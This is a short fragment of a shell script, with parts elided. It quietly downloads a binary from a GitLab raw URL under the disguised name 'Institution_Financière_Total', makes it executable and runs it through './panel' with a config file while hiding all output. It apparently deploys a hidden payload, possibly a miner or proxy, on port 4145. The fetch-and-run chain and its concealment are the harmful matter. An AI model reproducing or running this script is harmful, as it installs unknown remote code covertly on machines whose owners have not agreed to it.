...
port="4145"
wget -q -O Institution_Financière_Total https://gitlab.com/55113110159/dokerweb/-/raw/main/zydo191 && chmod +x Institution_Financière_Total
...
./panel ./Institution_Financière_Total -c "config.json" >/dev/null 2>&1
